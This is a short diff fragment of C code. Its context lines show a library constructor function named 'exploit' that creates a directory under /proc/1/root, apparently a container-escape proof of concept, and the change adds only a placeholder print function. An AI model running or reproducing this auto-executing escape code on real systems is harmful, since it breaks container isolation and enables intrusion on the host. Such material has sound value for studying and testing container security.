@@ -9,3 +9,7 @@ void __attribute__((constructor)) exploit(){
     mkdir("/proc/1/root/ESCAPE", 0755);
     return;
 }
+void XXXXX()
+{
+    printf("XXXXX\n");
+}
